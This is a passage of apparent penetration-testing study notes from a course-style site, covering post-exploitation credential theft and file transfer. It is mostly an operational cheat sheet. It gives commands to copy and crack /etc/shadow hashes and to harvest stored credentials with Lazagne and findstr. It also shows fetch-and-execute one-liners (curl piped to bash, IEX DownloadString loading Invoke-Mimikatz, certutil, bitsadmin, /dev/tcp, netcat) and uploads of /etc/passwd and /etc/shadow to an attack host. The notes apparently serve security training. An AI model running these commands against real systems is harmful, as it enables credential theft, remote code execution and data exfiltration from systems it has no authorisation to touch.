cp /etc/passwd /tmp/passwd.bak \nsudo cp /etc/shadow /tmp/shadow.bak \nunshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#hashcat-cracking-unshadowed-hashes","title":"Hashcat - Cracking Unshadowed Hashes","text":"<ul> <li><code>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#hashcat-cracking-md5-hashes","title":"Hashcat - Cracking MD5 Hashes","text":"<ul> <li><code>hashcat -m 500 -a 0 md5-hashes.list rockyou.txt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/","title":"Credential Hunting in Windows","text":"<p>Once we have access to a target Windows machine through the GUI or CLI, we can significantly benefit from incorporating credential hunting into our approach. Credential Hunting is the process of performing detailed searches across the file system and through various applications to discover credentials. To understand this concept, let's place ourselves in a scenario. We have gained access to an IT admin's Windows 10 workstation through RDP.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/#search-centric","title":"Search Centric","text":"<p>Many of the tools available to us in Windows have search functionality. In this day and age, there are search-centric features built into most applications and operating systems, so we can use this to our advantage on an engagement. A user may have documented their passwords somewhere on the system. There may even be default credentials that could be found in various files. It would be wise to base our search for credentials on what we know about how the target system is being used. In this case, we know we have access to an IT admin's workstation.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/#key-terms-to-search","title":"Key Terms to Search","text":"<p>Whether we end up with access to the GUI or CLI, we know we will have some tools to use for searching but of equal importance is what exactly we are searching for. Here are some helpful key terms we can use that can help us discover some credentials: Passwords   Passphrases     Keys Username    User account    Creds Users   Passkeys    Passphrases configuration   dbcredential    dbpassword pwd     Login   Credentials</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/#search-tools","title":"Search Tools","text":"<p>With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.</p> <p>By default, it will search various OS settings and the file system for files &amp; applications containing the key term entered in the search bar.</p> <p>We can also take advantage of third-party tools like Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.</p> <p>Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/#running-lazagne-all","title":"Running Lazagne All","text":"<ul> <li><code>start lazagne.exe all</code></li> </ul> <p>This will execute Lazagne and run all included modules. We can include the option -vv to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results.</p> <p>If we used the -vv option, we would see attempts to gather passwords from all Lazagne's supported software. We can also look on the GitHub page under the supported software section to see all the software Lazagne will try to gather credentials from. It may be a bit shocking to see how easy it can be to obtain credentials in clear text. Much of this can be attributed to the insecure way many applications store credentials.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/#using-findstr","title":"Using findstr","text":"<p>We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:</p> <ul> <li><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/#additional-considerations","title":"Additional Considerations","text":"<p>There are thousands of tools &amp; key terms we could use to hunt for credentials on Windows operating systems. Know that which ones we choose to use will be primarily based on the function of the computer. If we land on a Windows Server OS, we may use a different approach than if we land on a Windows Desktop OS. Always be mindful of how the system is being used, and this will help us know where to look. Sometimes we may even be able to find credentials by navigating and listing directories on the file system as our tools run.</p> <p>Here are some other places we should keep in mind when credential hunting:</p> <pre><code>- Passwords in Group Policy in the SYSVOL share\n- Passwords in scripts in the SYSVOL share\n- Password in scripts on IT shares\n- Passwords in web.config files on dev machines and IT shares\n- unattend.xml\n- Passwords in the AD user or computer description fields\n- KeePass databases --&gt; pull hash, crack and get loads of access.\n- Found on user systems and shares\n- Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint\n</code></pre> <p>You have gained access to an IT admin's Windows 10 workstation and begin your credential hunting process by searching for credentials in common storage locations.</p>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/","title":"OPEN SERVER:","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#python","title":"PYTHON:","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#wget","title":"WGET","text":"<ul> <li> <p><code>python3 -m http.server 1234</code> local machine</p> </li> <li> <p><code>wget http://10.10.14.1:8000/linenum.sh</code> target machine</p> </li> <li><code>curl http://10.10.14.1:8000/linenum.sh -o</code> linenum.sh</li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#scp","title":"SCP","text":"<ul> <li><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code> local machine</li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#base64","title":"Base64","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#encode-ssh-key-to-base64","title":"Encode SSH Key to Base64","text":"<ul> <li><code>cat id_rsa |base64 -w 0;echo</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#decode-the-file","title":"Decode the File","text":"<ul> <li><code>echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &lt;SNIP&gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; shell</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#web-downloads-with-wget-and-curl","title":"Web Downloads with Wget and cURL","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download-a-file-using-wget","title":"Download a File Using wget","text":"<ul> <li><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download-a-file-using-curl","title":"Download a File Using cURL","text":"<ul> <li><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#fileless-attacks-using-linux","title":"Fileless Attacks Using Linux","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#fileless-download-with-curl","title":"Fileless Download with cURL","text":"<ul> <li><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#fileless-download-with-wget","title":"Fileless Download with wget","text":"<ul> <li><code>wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download-with-bash-devtcp","title":"Download with Bash (/dev/tcp)","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#connect-to-the-target-webserver","title":"Connect to the Target Webserver","text":"<ul> <li><code>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#http-get-request","title":"HTTP GET Request","text":"<ul> <li><code>echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"&gt;&amp;3</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#print-the-response","title":"Print the Response","text":"<ul> <li><code>cat &lt;&amp;3</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#ssh-downloads","title":"SSH Downloads","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#enabling-the-ssh-server","title":"Enabling the SSH Server","text":"<ul> <li><code>sudo systemctl enable ssh</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#starting-the-ssh-server","title":"Starting the SSH Server","text":"<ul> <li><code>sudo systemctl start ssh</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#checking-for-ssh-listening-port","title":"Checking for SSH Listening Port","text":"<ul> <li><code>netstat -lnpt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#linux-downloading-files-using-scp","title":"Linux - Downloading Files Using SCP","text":"<ul> <li><code>scp plaintext@192.168.49.128:/root/myroot.txt .</code></li> </ul> <p><code>Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.</code></p>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#upload-operations","title":"Upload Operations","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#web-upload","title":"Web Upload","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#pwnbox-start-web-server","title":"Pwnbox - Start Web Server","text":"<ul> <li><code>sudo python3 -m pip install --user uploadserver</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#pwnbox-create-a-self-signed-certificate","title":"Pwnbox - Create a Self-Signed Certificate","text":"<ul> <li><code>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'</code> <code>The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#pwnbox-start-web-server_1","title":"Pwnbox - Start Web Server","text":"<ul> <li><code>mkdir https &amp;&amp; cd https</code></li> <li><code>sudo python3 -m uploadserver 443 --server-certificate /root/server.pem</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#linux-upload-multiple-files","title":"Linux - Upload Multiple Files","text":"<ul> <li><code>curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#alternative-web-file-transfer-method","title":"Alternative Web File Transfer Method","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#linux-creating-a-web-server-with-python3","title":"Linux - Creating a Web Server with Python3","text":"<ul> <li><code>python3 -m http.server</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#linux-creating-a-web-server-with-python27","title":"Linux - Creating a Web Server with Python2.7","text":"<ul> <li><code>python2.7 -m SimpleHTTPServer</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#linux-creating-a-web-server-with-php","title":"Linux - Creating a Web Server with PHP","text":"<ul> <li><code>php -S 0.0.0.0:8000</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#linux-creating-a-web-server-with-ruby","title":"Linux - Creating a Web Server with Ruby","text":"<ul> <li><code>ruby -run -ehttpd . -p8000</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download-the-file-from-the-target-machine-onto-the-pwnbox","title":"Download the File from the Target Machine onto the Pwnbox","text":"<ul> <li><code>wget 192.168.49.128:8000/filetotransfer.txt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#scp-upload","title":"SCP Upload","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#file-upload-using-scp","title":"File Upload using SCP","text":"<ul> <li><code>scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#transferring-files-with-code","title":"Transferring Files with Code","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#python_1","title":"Python","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#python-2-download","title":"Python 2 - Download","text":"<ul> <li><code>python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#python-3-download","title":"Python 3 - Download","text":"<ul> <li><code>python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#php","title":"PHP","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#php-download-with-file_get_contents","title":"PHP Download with File_get_contents()","text":"<ul> <li><code>php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#php-download-with-fopen","title":"PHP Download with Fopen()","text":"<ul> <li><code>php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#php-download-a-file-and-pipe-it-to-bash","title":"PHP Download a File and Pipe it to Bash","text":"<ul> <li><code>php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#other-languages","title":"Other Languages","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#ruby-download-a-file","title":"Ruby - Download a File","text":"<ul> <li><code>ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#perl-download-a-file","title":"Perl - Download a File","text":"<ul> <li><code>perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#upload-operations-using-python3","title":"Upload Operations using Python3","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#starting-the-python-uploadserver-module","title":"Starting the Python uploadserver Module","text":"<ul> <li><code>python3 -m uploadserver</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#uploading-a-file-using-a-python-one-liner","title":"Uploading a File Using a Python One-liner","text":"<ul> <li><code>python3 -c 'import requests;requests.post(\"http://192.168.49.128:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#miscellaneous-file-transfer-methods","title":"Miscellaneous File Transfer Methods","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#netcat","title":"Netcat","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#netcat-compromised-machine-listening-on-port-8000","title":"NetCat - Compromised Machine - Listening on Port 8000","text":"<ul> <li><code>nc -l -p 8000 &gt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#ncat-compromised-machine-listening-on-port-8000","title":"Ncat - Compromised Machine - Listening on Port 8000","text":"<ul> <li><code>ncat -l -p 8000 --recv-only &gt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#netcat-attack-host-sending-file-to-compromised-machine","title":"Netcat - Attack Host - Sending File to Compromised machine","text":"<ul> <li><code>nc -q 0 192.168.49.128 8000 &lt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#ncat-attack-host-sending-file-to-compromised-machine","title":"Ncat - Attack Host - Sending File to Compromised machine","text":"<ul> <li><code>ncat --send-only 192.168.49.128 8000 &lt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#attack-host-sending-file-as-input-to-netcat","title":"Attack Host - Sending File as Input to Netcat","text":"<ul> <li><code>sudo nc -l -p 443 -q 0 &lt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#compromised-machine-connect-to-netcat-to-receive-the-file","title":"Compromised Machine Connect to Netcat to Receive the File","text":"<ul> <li><code>nc 192.168.49.128 443 &gt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#attack-host-sending-file-as-input-to-ncat","title":"Attack Host - Sending File as Input to Ncat","text":"<ul> <li><code>sudo ncat -l -p 443 --send-only &lt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#compromised-machine-connect-to-ncat-to-receive-the-file","title":"Compromised Machine Connect to Ncat to Receive the File","text":"<ul> <li><code>ncat 192.168.49.128 443 --recv-only &gt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#compromised-machine-connecting-to-netcat-using-devtcp-to-receive-the-file","title":"Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File","text":"<ul> <li><code>cat &lt; /dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#protected-file-transfers","title":"Protected File Transfers","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#file-encryption-on-linux","title":"File Encryption on Linux","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#encrypting-etcpasswd-with-openssl","title":"Encrypting /etc/passwd with openssl","text":"<ul> <li><code>openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#decrypt-passwdenc-with-openssl","title":"Decrypt passwd.enc with openssl","text":"<ul> <li><code>openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#catching-files-over-https","title":"Catching Files over HTTP/S","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#nginx-enabling-put","title":"Nginx - Enabling PUT","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#create-a-directory-to-handle-uploaded-files","title":"Create a Directory to Handle Uploaded Files","text":"<ul> <li><code>sudo mkdir -p /var/www/uploads/SecretUploadDirectory</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#change-the-owner-to-www-data","title":"Change the Owner to www-data","text":"<ul> <li><code>sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#create-nginx-configuration-file","title":"Create Nginx Configuration File","text":"<p>Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents:</p> <pre><code>server {\n    listen 9001;\n\n    location /SecretUploadDirectory/ {\n        root    /var/www/uploads;\n        dav_methods PUT;\n    }\n}\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#symlink-our-site-to-the-sites-enabled-directory","title":"Symlink our Site to the sites-enabled Directory","text":"<ul> <li><code>sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#start-nginx","title":"Start Nginx","text":"<ul> <li><code>sudo systemctl restart nginx.service</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#upload-file-using-curl","title":"Upload File Using cURL","text":"<ul> <li> <p><code>curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt</code></p> </li> <li> <p><code>tail -1 /var/www/uploads/SecretUploadDirectory/users.txt</code></p> </li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#living-off-the-land","title":"Living off The Land","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#create-certificate-in-our-pwnbox","title":"Create Certificate in our Pwnbox","text":"<ul> <li><code>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#stand-up-the-server-in-our-pwnbox","title":"Stand up the Server in our Pwnbox","text":"<ul> <li><code>openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download-file-from-the-compromised-machine","title":"Download File from the Compromised Machine","text":"<ul> <li><code>openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#other-common-living-off-the-land-tools","title":"Other Common Living off the Land tools","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#file-download-with-bitsadmin","title":"File Download with Bitsadmin","text":"<ul> <li><code>bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\htb-student\\Desktop\\nc.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download","title":"Download","text":"<ul> <li><code>Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#certutil","title":"Certutil","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Linux/#download-a-file-with-certutil","title":"Download a File with Certutil","text":"<ul> <li><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/","title":"Attack to Target","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-base64-encode-decode","title":"PowerShell Base64 Encode &amp; Decode","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#pwnbox-check-ssh-key-md5-hash","title":"Pwnbox Check SSH Key MD5 Hash","text":"<ul> <li><code>COR33@htb[/htb]$ md5sum id_rsa</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#pwnbox-encode-ssh-key-to-base64","title":"Pwnbox Encode SSH Key to Base64","text":"<ul> <li><code>cat id_rsa |base64 -w 0;echo</code></li> </ul> <p>-<code>[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"\"))</code></p>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#confirming-the-md5-hashes-match","title":"Confirming the MD5 Hashes Match","text":"<ul> <li><code>Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-web-downloads","title":"PowerShell Web Downloads","text":"<p>Method  Description OpenRead    Returns the data from a resource as a Stream. OpenReadAsync   Returns the data from a resource without blocking the calling thread. DownloadData    Downloads data from a resource and returns a Byte array. DownloadDataAsync   Downloads data from a resource and returns a Byte array without blocking the calling thread. DownloadFile    Downloads data from a resource to a local file. DownloadFileAsync   Downloads data from a resource to a local file without blocking the calling thread. DownloadString  Downloads a String from a resource and returns a String. DownloadStringAsync     Downloads a String from a resource without blocking the calling thread.</p>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#file-download","title":"File Download","text":"<ul> <li> <p><code>(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')</code></p> </li> <li> <p><code>(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')</code></p> </li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-downloadstring-fileless-method","title":"PowerShell DownloadString - Fileless Method","text":"<ul> <li> <p><code>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</code></p> </li> <li> <p><code>(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX</code></p> </li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-invoke-webrequest","title":"PowerShell Invoke-WebRequest","text":"<p>iwr, curl, and wget instead of the Invoke-WebRequest full name. - <code>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1</code></p>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#common-errors-with-powershell","title":"Common Errors with PowerShell","text":"<p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.. This can be bypassed using the parameter -UseBasicParsing.</p> <ul> <li><code>Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX</code></li> </ul> <p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p> <ul> <li><code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#smb-downloads","title":"SMB Downloads","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#create-the-smb-server","title":"Create the SMB Server","text":"<p>We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with smbserver.py from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.</p> <ul> <li><code>sudo impacket-smbserver share -smb2support /tmp/smbshare</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#copy-a-file-from-the-smb-server","title":"Copy a File from the SMB Server","text":"<ul> <li><code>copy \\\\192.168.220.133\\share\\nc.exe</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#create-the-smb-server-with-a-username-and-password","title":"Create the SMB Server with a Username and Password","text":"<ul> <li><code>sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#mount-the-smb-server-with-username-and-password","title":"Mount the SMB Server with Username and Password","text":"<ul> <li><code>net use n: \\\\192.168.220.133\\share /user:test test</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#ftp-downloads","title":"FTP Downloads","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#setting-up-a-python3-ftp-server","title":"Setting up a Python3 FTP Server","text":"<ul> <li><code>sudo python3 -m pyftpdlib --port 21</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#transfering-files-from-an-ftp-server-using-powershell","title":"Transfering Files from an FTP Server Using PowerShell","text":"<ul> <li><code>(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\\Users\\Public\\ftp-file.txt')</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#target-to-attack","title":"Target to Attack","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-base64-encode-decode_1","title":"PowerShell Base64 Encode &amp; Decode","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#encode-file-using-powershell","title":"Encode File Using PowerShell","text":"<ul> <li><code>[Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))</code></li> <li><code>Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#decode-base64-string-in-linux","title":"Decode Base64 String in Linux","text":"<ul> <li><code>echo = | base64 -d &gt; hosts</code></li> <li><code>md5sum hosts</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-web-uploads","title":"PowerShell Web Uploads","text":""},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#installing-a-configured-webserver-with-upload","title":"Installing a Configured WebServer with Upload","text":"<ul> <li><code>pip3 install uploadserver</code></li> <li><code>python3 -m uploadserver</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-script-to-upload-a-file-to-python-upload-server","title":"PowerShell Script to Upload a File to Python Upload Server","text":"<ul> <li><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')</code></li> <li><code>Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/TransferFiles/Windows/#powershell-base64-web-upload","title":"PowerShell Base64 Web Upload","text":"<ul> <li><code>$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))</code></li> <li> 